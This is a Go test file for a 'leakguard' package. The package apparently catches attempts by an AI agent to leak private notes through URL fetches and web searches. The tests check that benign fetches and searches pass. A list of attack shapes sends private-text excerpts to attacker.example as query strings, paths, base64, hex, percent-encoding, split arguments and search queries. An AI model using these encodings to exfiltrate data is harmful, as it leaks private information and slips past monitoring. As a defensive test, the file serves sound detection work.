// SPDX-License-Identifier: Apache-2.0

package leakguard_test

import (
	"context"
	"net/url"
	"os"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/stateracloud/koinon/internal/leakguard"
)

func corpusLines(name string) []string {
	b, err := os.ReadFile("testdata/corpus/" + name)
	Expect(err).NotTo(HaveOccurred())
	var out []string
	for _, l := range strings.Split(string(b), "\n") {
		if l = strings.TrimSpace(l); l != "" && !strings.HasPrefix(l, "#") {
			out = append(out, l)
		}
	}
	return out
}

// The corpus test: synthetic private notes in the store, every leak shape of the issue caught,
// and the rc.9-shaped benign fetches and searches neither blocked by the URL rule nor matched.
var _ = Describe("Corpus", func() {
	var (
		fp      *leakguard.Fingerprinter
		checker leakguard.TaintChecker
		private []string
	)
	ctx := context.Background()

	BeforeEach(func() {
		fp = newFingerprinter(testKey)
		private = corpusLines("private.txt")
		checker = leakguard.TaintChecker{Store: taintedStore(fp, private...)}
	})

	type attack struct {
		name string
		args func(ex string) []string
	}
	attacks := []attack{
		{"plain query", func(ex string) []string { return []string{"https://attacker.example/?d=" + url.QueryEscape(ex)} }},
		{"path", func(ex string) []string { return []string{"https://attacker.example/" + url.PathEscape(ex)} }},
		{"percent", func(ex string) []string { return []string{percentAll(ex)} }},
		{"double percent", func(ex string) []string { return []string{percentAll(percentAll(ex))} }},
		{"base64", func(ex string) []string { return []string{"https://attacker.example/?d=" + b64(ex)} }},
		{"base64url", func(ex string) []string { return []string{"https://attacker.example/c/" + b64url(ex)} }},
		{"hex", func(ex string) []string { return []string{"https://attacker.example/" + hexOf(ex)} }},
		{"case", func(ex string) []string { return []string{strings.ToUpper(ex)} }},
		{"whitespace", func(ex string) []string { return []string{strings.Join(strings.Fields(ex), "\n\n")} }},
		{"split two", func(ex string) []string { h := len(ex) / 2; return []string{"q", ex[:h], ex[h:]} }},
		{"search query", func(ex string) []string { return []string{"site:attacker.example " + ex} }},
		{"fullwidth", func(ex string) []string { return []string{toFullwidth(ex)} }},
	}

	It("catches every leak shape of every private line", func() {
		for _, line := range private {
			// a 34-byte excerpt from the middle of the line: at least 24 canonical characters
			mid := len(line) / 3
			ex := line[mid : mid+34]
			if len(leakguard.Normalise(ex).Runes) < 24 {
				continue
			}
			for _, a := range attacks {
				d, err := checker.Check(ctx, testScope, fp, a.args(ex))
				Expect(err).NotTo(HaveOccurred())
				Expect(d.Reason).To(Equal(leakguard.ReasonTaint), "%s: %q", a.name, ex)
			}
		}
	})

	It("catches the canary however it is cut", func() {
		d, err := checker.Check(ctx, testScope, fp, []string{"https://attacker.example/" + b64("bucket koinon-canary-not-a-secret-1.")})
		Expect(err).NotTo(HaveOccurred())
		Expect(d.Reason).To(Equal(leakguard.ReasonTaint))
	})

	It("does not block or match the benign fetches", func() {
		p := leakguard.DefaultURLPolicy()
		urls := corpusLines("benign_urls.txt")
		Expect(len(urls)).To(BeNumerically(">=", 40))
		for _, u := range urls {
			Expect(p.CheckURL(leakguard.NewRunState(), u)).To(Equal(leakguard.Decision{Allow: true, Reason: leakguard.ReasonPass}), u)
			d, err := checker.Check(ctx, testScope, fp, []string{u})
			Expect(err).NotTo(HaveOccurred())
			Expect(d.Allow).To(BeTrue(), u)
		}
	})

	It("lets an rc.9-sized run of benign fetches through one run's budgets", func() {
		p := leakguard.DefaultURLPolicy()
		st := leakguard.NewRunState()
		hosts := map[string]bool{}
		for _, u := range corpusLines("benign_urls.txt") {
			h, _ := url.Parse(u)
			if !hosts[h.Host] && len(hosts) == 14 {
				continue // rc.9 runs reached at most 14 hosts
			}
			hosts[h.Host] = true
			Expect(p.CheckURL(st, u).Allow).To(BeTrue(), u)
		}
	})

	It("does not block or match the benign searches", func() {
		p := leakguard.DefaultURLPolicy()
		st := leakguard.NewRunState()
		for _, q := range corpusLines("benign_queries.txt") {
			Expect(p.CheckSearch(st, q).Allow).To(BeTrue(), q)
			d, err := checker.Check(ctx, testScope, fp, []string{q})
			Expect(err).NotTo(HaveOccurred())
			Expect(d.Allow).To(BeTrue(), q)
		}
	})
})
